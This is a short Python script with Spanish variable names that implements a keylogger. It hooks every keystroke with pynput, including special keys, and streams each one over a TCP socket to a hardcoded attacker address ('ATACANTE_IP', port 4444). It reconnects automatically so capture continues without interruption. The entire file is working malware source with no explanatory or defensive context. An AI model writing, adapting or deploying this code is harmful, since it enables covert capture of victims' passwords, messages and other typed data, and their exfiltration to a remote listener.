from pynput import keyboard
import socket
import time

ATACANTE_IP = "10.10.10.5"
ATACANTE_PUERTO = 4444

def conectar():
    while True:
        try:
            s = socket.socket()
            s.connect((ATACANTE_IP, ATACANTE_PUERTO))
            return s
        except:
            time.sleep(3)

conexion = conectar()

def al_presionar(tecla):
    global conexion

    try:
        letra = tecla.char
    except AttributeError:
        if tecla == keyboard.Key.space:
            letra = ' '
        elif tecla == keyboard.Key.enter:
            letra = '\n'
        elif tecla == keyboard.Key.backspace:
            letra = '[BACK]'
        elif tecla == keyboard.Key.tab:
            letra = '[TAB]'
        else:
            letra = f'[{tecla.name}]'

    try:
        conexion.send(letra.encode('utf-8'))
    except:
        conexion = conectar()
        conexion.send(letra.encode('utf-8'))

listener = keyboard.Listener(on_press=al_presionar)
listener.start()
listener.join()